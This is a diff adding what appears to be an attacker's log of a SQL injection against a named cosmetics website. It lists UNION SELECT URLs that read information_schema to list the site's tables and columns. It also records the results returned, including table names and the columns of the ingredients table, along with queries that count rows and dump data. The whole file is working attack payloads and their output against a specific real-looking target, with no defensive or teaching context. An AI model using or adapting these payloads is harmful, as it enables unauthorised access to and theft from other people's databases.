@@ -1,0 +1,13 @@
+http://www.cosmetic-ingredients.net/product.php?brand=-370 union select all 1,2,3,4,5,CONVERT(group_concat(table_name) USING latin1),7 from information_schema.tables where table_schema=database()--
+
+brands,ingredients,prices,products,reviews
+
+http://www.cosmetic-ingredients.net/product.php?brand=-370 union select all 1,2,3,4,5,CONVERT(group_concat(column_name) USING latin1),7 from information_schema.columns where table_schema=database()--
+
+http://www.cosmetic-ingredients.net/product.php?brand=-370 union select all 1,2,3,4,5,CONVERT(group_concat(column_name) USING latin1),7 from information_schema.columns where table_schema=database() and TABLE_NAME='ingredients'--
+
+id,name,goodbad,short_description,detail_description,comedogenic
+
+http://www.cosmetic-ingredients.net/product.php?brand=-370 union select all 1,2,3,4,5,CONVERT(count(*) USING latin1),7 from products--
+
+http://www.cosmetic-ingredients.net/product.php?brand=-370 union select all 1,2,3,4,5,CONVERT(group_concat(name) USING latin1),7 from ingredients --
